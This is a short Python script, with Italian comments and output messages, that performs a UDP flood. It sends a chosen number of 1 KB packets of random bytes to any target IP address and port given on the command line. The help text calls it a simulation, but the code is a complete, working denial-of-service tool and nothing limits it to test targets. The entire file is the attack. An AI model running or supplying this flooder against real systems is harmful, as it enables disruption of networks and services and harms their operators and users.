import socket
import random
import argparse

def generate_packet(size):
    """Genera un pacchetto di byte casuali di dimensione specificata."""
    return random.randbytes(size)

def udp_flood(target_ip, target_port, packet_count):
    """Esegue l'UDP flood verso il target specificato."""
    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        print(f"Inizio invio di {packet_count} pacchetti da 1 KB a {target_ip}:{target_port}...")

        for i in range(packet_count):
            # Genera un pacchetto da 1 KB
            packet = generate_packet(1024)

            # Invia il pacchetto
            sock.sendto(packet, (target_ip, target_port))

            print(f"Pacchetto {i + 1}/{packet_count} inviato.", end="\r")

        print("\nFlood completato.")

    except Exception as e:
        print(f"Errore durante l'esecuzione del flood: {e}")

    finally:
        sock.close()

if __name__ == "__main__":
    # Input dell'utente
    parser = argparse.ArgumentParser(description="Simulazione di un UDP flood.")
    parser.add_argument("target_ip", type=str, help="Indirizzo IP del target.")
    parser.add_argument("target_port", type=int, help="Porta UDP del target.")
    parser.add_argument("packet_count", type=int, help="Numero di pacchetti da inviare.")

    args = parser.parse_args()

    # Chiamata alla funzione principale
    udp_flood(args.target_ip, args.target_port, args.packet_count)
